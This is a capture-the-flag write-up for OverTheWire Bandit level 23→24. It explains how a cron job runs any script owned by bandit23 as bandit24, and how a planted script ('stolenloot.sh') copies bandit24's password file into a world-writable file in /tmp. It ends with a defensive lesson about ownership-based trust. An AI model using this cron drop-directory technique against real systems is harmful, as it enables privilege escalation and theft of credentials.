# Bandit Level 23 → 24

## Objective

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed.

***NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!*

## Concept Tested

Cron driven arbitrary code execution via a "drop zone" directory which is an owner based allow list (`owner == bandit23`) that becomes a privilege escalation primitive because `bandit23` fully controls what those scripts contain.

## Initial Access

Establish an SSH session to the target host as user `bandit23`:

```bash
$ ssh bandit23@bandit.labs.overthewire.org -p 2220
bandit23@bandit.labs.overthewire.org's password: [REDACTED]
bandit23@bandit:~$
```

## Recon

Same as the last two levels, I'll check to identify if a cron job is running as `bandit24` as it is the level I need to reach next.

```bash
bandit23@bandit:~$ ls -la /etc/cron.d
total 56
drwxr-xr-x   2 root root  4096 Jul  3 16:19 .
drwxr-xr-x 124 root root 12288 Aug 17 21:05 ..
-rw-r--r--   1 root root   102 Nov  5  2025 .placeholder
-r--r-----   1 root root    47 Jun 24 14:59 behemoth4_cleanup
-rw-r--r--   1 root root   127 Jul  3 16:19 clean_tmp
-rw-r--r--   1 root root   120 Jun 24 14:58 cronjob_bandit22
-rw-r--r--   1 root root   122 Jun 24 14:58 cronjob_bandit23
-rw-r--r--   1 root root   120 Jun 24 14:59 cronjob_bandit24
-rw-r--r--   1 root root   188 Feb 13  2026 e2scrub_all
-r--r-----   1 root root    48 Jun 24 15:00 leviathan5_cleanup
-rw-------   1 root root   138 Jun 24 15:01 manpage3_resetpw_job
-rwx------   1 root root    52 Jun 24 15:02 otw-tmp-dir
```

Now that I have verified that the target `bandit24` has a cron job script running. I'll now `cat` it and the script path to reveal what activities the script performs.

```bash
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```

As the same as the others. This script also runs every minute. Additionally, this is how this script reads line by line:

- `cd` changes the directory into `/var/spool/bandit24/foo since the script is running as bandit24. 
- Then it loops over every entry including dotfiles.
- `stat` allows for each file's owner to be checked.
- Only executes files owned by `bandit23` but it deletes every file regardless of ownership.

The last point matters because I can't leave a permanent script there as it gets removed on the same pass whether or not it ran.

```bash
bandit23@bandit:~$ ls -la /var/spool/bandit24/
total 268
dr-xr-x--- 3 bandit24 bandit23   4096 Jun 24 14:59 .
drwxr-xr-x 6 root     root       4096 Jun 24 15:02 ..
drwxrwx-wx 8 root     bandit24 262144 Aug 30 02:50 foo
```

I checked the permissions on the target directory before assuming I could drop a file there. `-wx` for "other" (which includes me as bandit23) means I have write and execute (traverse) access but not read. I can create files and enter the directory, but I can't `ls` its existing contents. That told me I'd need somewhere else (like `/tmp`) to receive the output, since I can't just browse `/var/spool/bandit24/foo` to see results land there.

## Solution

```bash
bandit23@bandit:~$ mkdir /tmp/mypassword
bandit23@bandit:~$ cd /tmp/mypassword
bandit23@bandit:/tmp/mypassword$ echo '#!/bin/bash' > stolenloot.sh
bandit23@bandit:/tmp/mypassword$ echo 'cat /etc/bandit_pass/bandit24 > /tmp/mypassword/pass' >> stolenloot.sh
bandit23@bandit:/tmp/mypassword$ chmod 777 stolenloot.sh
bandit23@bandit:/tmp/mypassword$ touch pass
bandit23@bandit:/tmp/mypassword$ chmod 777 pass
bandit23@bandit:/tmp/mypassword$ cp stolenloot.sh /var/spool/bandit24/foo
```

This payload was built in a scratch directory I fully control first, rather than editing directly in `/var/spool/bandit24/foo` (which I can't even read back from). The script's job is simple: when it runs as `bandit24` (thanks to cron), it can read `/etc/bandit_pass/bandit24`, a file `bandit23` can't read directly, and I'll have it write that content to a path in `/tmp` that I do have read access to. `chmod 777` on `stolenloot.sh` guarantees `bandit24` has execute permission on the script itself, since I can't rely on whatever umask was active when I created it. Additionally, copying (`cp`) rather than moving means the file is created fresh, owned by `bandit23` (the user who created it), satisfying the script's `owner == bandit23` check, while I keep my original safe in `/tmp/mypassword` in case this run gets missed or fails for some reason.

The `touch pass && chmod 777 pass` step is easy to skip past but is actually load-bearing. `mkdir /tmp/mypassword` created that directory as `bandit23` with a typical `umask 022`, giving mode `755` — meaning "other" (which includes `bandit24`, the identity cron will run my script as) has read and execute on the directory, but not write. Creating a **brand-new** file inside a directory requires write permission on that directory, which `bandit24` doesn't have here — so if `stolenloot.sh` tried to redirect output into a `pass` file that didn't exist yet, it would fail with a permission error the moment `bandit24`'s shell tried to create it. Writing into an **existing** file, by contrast, only checks the write permission bits on the file itself, not the directory it lives in. So pre-creating `pass` as `bandit23` and opening it up with `chmod 777` sidesteps the directory-permission problem entirely: `bandit24`'s process only ever needs to truncate-and-write an existing file it already has permission on.

```bash
bandit23@bandit:/tmp/mypassword$ cat /tmp/mypassword/pass
[REDACTED]
```

Once cron's next minute-tick fires, it `cd`s into `/var/spool/bandit24/foo`, finds `stolenloot.sh`, confirms via `stat` that bandit23 owns it, runs it with `timeout -s 9 60` (so it's forcibly killed if it somehow hangs past 60 seconds, which is irrelevant here since my script finishes instantly), then deletes it. The side effect of the script I wrote is that `bandit24`'s password is now sitting in the `pass` file in `/tmp`, and that persists after the source script is gone — which is exactly the loophole. The cleanup step removes the script, not what the script already did while running.

## Verification

Authenticate as `bandit24` using the retrieved password:

```bash
[Laptop-3344]:~$ ssh bandit24@bandit.labs.overthewire.org -p 2220
bandit24@bandit.labs.overthewire.org's password: [REDACTED]
bandit24@bandit:~$ whoami
bandit24
```

**Explanation:** Initiating a new SSH session to port `2220` and supplying the retrieved password at the prompt grants access. Running `whoami` and observing the updated shell prompt (`bandit24@bandit:~$`) confirms successful authentication as `bandit24`.

## Why This Works

The script's ownership check (`owner == bandit23`) is a legitimate access-control decision, it's meant to say "only run scripts that a trusted account placed here" but it conflates ownership with trustworthiness of content. Ownership just means `bandit23` created the file; it says nothing about what's inside it. Since `bandit23` is the account I'm logged in as, I can write any code I want into that file, and the moment cron executes it under `bandit24`'s identity (because the whole script's loop, `stat` check and `timeout ./$i` call, all run as `bandit24`, launched by cron's `bandit24` field), my code inherits `bandit24`'s file-read permissions for that one execution. The `rm -f "./$i"` cleanup only deletes the script file from disk; it does nothing to undo whatever side effects the script already caused while it ran (like writing to a file elsewhere), so the "cleanup" gives a false sense of the exploit being erased.

## Key Takeaway

Never use "who owns this file" as a stand-in for "is this code safe to run as a privileged user" — ownership answers who put it there, not what it does. If a system needs to accept and run jobs from a lower-privileged account on behalf of a higher-privileged one, that's a sandboxing/code-review problem, not something an owner check alone can solve; treat any directory that's writable-by-low/executable-by-high as equivalent to handing that low-privileged user a temporary root shell.

## Password

`[REDACTED - see level for retrieval method]`


---
